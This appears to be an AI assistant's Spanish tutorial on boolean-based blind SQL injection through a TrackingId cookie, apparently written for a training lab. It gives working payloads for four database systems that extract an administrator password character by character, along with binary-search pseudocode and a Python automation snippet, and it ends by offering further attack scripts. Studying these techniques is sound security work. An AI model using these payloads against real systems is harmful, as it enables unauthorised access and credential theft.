# Explotar Blind SQLi mediante respuestas condicionales y uso de SUBSTRING



## 1) Idea general 

En **Blind SQLi boolean-based** la aplicación no muestra resultados de la consulta ni errores, pero su **comportamiento cambia** (por ejemplo muestra/oculta un texto, cambia el código HTTP, cambia longitud de respuesta, etc.) según si la consulta interna devuelve filas o no.

Aprovechando esto podemos inyectar **condiciones booleanas** que dependan de datos internos (p. ej. el primer carácter del password) y observar si la aplicación responde de una u otra manera. Así convertimos la respuesta booleana en un canal de exfiltración, un bit a la vez.

---

## 2) Caso práctico (cookie TrackingId)

Aplicación recibe:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

El servidor ejecuta internamente:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4';
```

Si existe la fila → la app muestra "Welcome back". Si no existe → no muestra.

Si inyectamos:

```
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

la primera condición es verdadera y provoca la aparición de "Welcome back"; la segunda no. Con esto comprobamos que el parámetro llega a la consulta y podemos usar la presencia/ausencia del texto como una señal booleana.

---

## 3) ¿Cómo funciona SUBSTRING y variantes?

`SUBSTRING` extrae una subcadena de una cadena más grande. La sintaxis varía ligeramente entre SGBD.

### Sintaxis por SGBD

* **MySQL**: `SUBSTRING(str, pos, len)`  — pos empieza en 1.

  ```sql
  SUBSTRING(password, 1, 1)  -- primer carácter
  ```
* **PostgreSQL**: `SUBSTRING(str FROM pos FOR len)` o `SUBSTRING(str, pos, len)` (la función clásica `SUBSTRING(str FROM pos FOR len)` también funciona).

  ```sql
  SUBSTRING(password FROM 1 FOR 1)
  ```
* **SQL Server (T-SQL)**: `SUBSTRING(expression, start, length)`

  ```sql
  SUBSTRING(password, 1, 1)
  ```
* **Oracle**: `SUBSTR(string, start, length)` (nota la diferencia en el nombre)

  ```sql
  SUBSTR(password, 1, 1)
  ```

**Observación:** en todos los SGBD la posición suele empezar en 1 (no en 0).

---

## 4) Estrategia básica para extraer un carácter (ejemplo)

Queremos saber el primer carácter del password del usuario `Administrator`.

Payload conceptual (si el valor se inyecta dentro de comillas):

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s'--
```

Si la respuesta muestra "Welcome back" → la condición es verdadera → primer carácter = 's'.
Si no → falso.

### Paso a paso completo:

1. Confirmar que el parámetro es vulnerable con condiciones triviales (`' AND '1'='1` / `' AND '1'='2`).
2. Determinar la longitud aproximada (opcional) probando `LENGTH`/`LEN` con booleanos o avanzando hasta obtener false cuando la posición excede la longitud.
3. Para posición `i` probar caracteres `c` hasta encontrar el verdadero:

   * `' AND SUBSTRING((SELECT Password ...), i, 1) = 'c' -- `
   * o usar comparaciones `>` / `<` para acelerar (`> 'm'`, etc.).

---

## 5) Optimización: búsqueda binaria en el alfabeto (reduce peticiones)

En vez de probar carácter por carácter en un conjunto de 95 caracteres imprimibles, usa comparaciones `>` y `<` con orden lexicográfico o ASCII:

* PRIMER paso: prueba si `SUBSTRING(...) > 'm'` → si true el carácter está en la mitad alta; si false está en la mitad baja.
* Repetir dividiendo el rango hasta identificar el carácter exacto.

Ejemplo (MySQL):

```
xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)) > 109 --
```

Donde `109` es ASCII de `m`. Usando `ASCII()` reduces comparaciones de texto a comparaciones numéricas.

**Beneficio:** búsqueda binaria sobre 95 caracteres toma ~7 comparaciones (log2(95) ≈ 7) en vez de ~95.

---

## 6) Uso de ASCII/ORD para comparaciones numéricas (más robusto)

En lugar de comparar caracteres directamente (pueden depender de collation), usa `ASCII()` (MySQL/Postgres) o `ASCII()`/`UNICODE()` (SQL Server) para obtener el código numérico del carácter:

* **MySQL / Postgres:** `ASCII(SUBSTRING(...,1,1))` → devuelve número.
* **SQL Server:** `ASCII(SUBSTRING(...,1,1))` también funciona.
* **Oracle:** usar `ASCII(SUBSTR(...,1,1))`.

Payload para probar si primer carácter tiene ASCII > 109:

```
xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)) > 109--
```

Si true → carácter > 'm'.

---

## 7) Extraer palabra completa: bucle sobre posiciones

Pseudocódigo lógico (automatizable):

```
for pos in 1..max_len:
  lo = 32; hi = 126   # rango ASCII imprimible
  while lo <= hi:
    mid = (lo+hi)//2
    payload = "' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),{},1)) > {} --".format(pos, mid)
    if response_shows_true(payload):
      lo = mid + 1
    else:
      hi = mid - 1
  char = chr(lo)  # o hi, según convención
  if char == '\0' or char == terminator: break
  append char to password
```

Esto reduce significativamente el número de peticiones por carácter.

---

## 8) Manejo de longitudes y límites

* Si no conocés la longitud, puedes detectar el final cuando `SUBSTRING(..., pos, 1)` devuelve `''` o `NULL` o cuando una comparación siempre falla. Otra técnica es probar `LENGTH()` o `LEN()` con booleanos:

  ```sql
  ' AND (SELECT LENGTH(Password) FROM Users WHERE Username='Administrator') > 10 --
  ```

  aplicando búsqueda binaria para la longitud.

* Ten cuidado con límites de tamaño de consultas y con rate limits; muchos labs usan `ROWNUM` o `LIMIT` en subqueries para evitar múltiples filas.

---

## 9) Ejemplos concretos por SGBD (payloads)

**Nota:** ajustá comillas y final de comentario (`-- ` vs `--`) según SGBD y contexto. URL-encodea si usás GET.

### MySQL (string context, cookie):

* Comprobación básica:

```
TrackingId=xyz' AND '1'='1--
```

* Primer carácter > 'm':

```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1) > 'm'--
```

* Usando ASCII:

```
TrackingId=xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1)) > 109--
```

### PostgreSQL:

* Usar `SUBSTRING(... FROM pos FOR 1)` o `SUBSTRING(...,pos,1)`:

```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='Administrator') FROM 1 FOR 1) = 's'--
```

* ASCII:

```
TrackingId=xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='Administrator') FROM 1 FOR 1)) > 109--
```

### SQL Server (T-SQL):

```
TrackingId=xyz' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='Administrator'),1,1)) > 109--
```

### Oracle (SUBSTR):

```
TrackingId=xyz' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='Administrator'),1,1)) > 109--
```

---

## 10) Detección fiable de la condición verdadera/falsa

Necesitas un criterio consistente para decidir si la respuesta indica `true` o `false`:

* Presencia/ausencia de un texto ("Welcome back").
* Diferencia en `HTTP status code` (200 vs 500/302).
* Diferencia en longitud de la respuesta (content-length).
* Diferencia en tiempo (si la técnica usa delays).

Automatiza la evaluación: compara con la respuesta de referencia (`true` vs `false`) y aplica tolerancia a ruido.

---

## 11) Optimización avanzada

* **Batching**: Algunas técnicas permiten extraer múltiples bits en una sola petición usando operaciones bitwise y convertirlas a números (más complejo).
* **Extracción por bloques**: en lugar de un carácter, extraer 2-4 bytes y luego dividirlos localmente.
* **Paralelización**: lanzar múltiples threads para distintas posiciones (cuidado con rate-limits).
* **Errores y reintentos**: reintenta peticiones que fallan por conectividad; descarta falsos positivos por fluctuaciones.

---

## 12) Automatización práctica

* **Burp Intruder**: útil para iterar payloads por posición/caracter y ordenar por tiempo/len.
* **sqlmap**: puede automatizar blind extraction (`--technique=B` para boolean, `--technique=T` para time) pero primero fingerprintea y limita el daño.
* **Scripts Python**: `requests` + lógica de comparación/tiempo para control fino y búsqueda binaria.

Ejemplo minimal de payload en Python (pseudocódigo):

```py
payload = "xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='Administrator'),{pos},1)) > {mid}--"
resp = requests.get(url, cookies={'TrackingId': payload})
if 'Welcome back' in resp.text:
    # condición verdadera
```

---





Si querés, subo este documento al lienzo (ya creado) y genero además un archivo con scripts de ejemplo (Python) para automatizar extracción con búsqueda binaria, y payloads codificados para Burp Repeater. ¿Querés que lo haga?
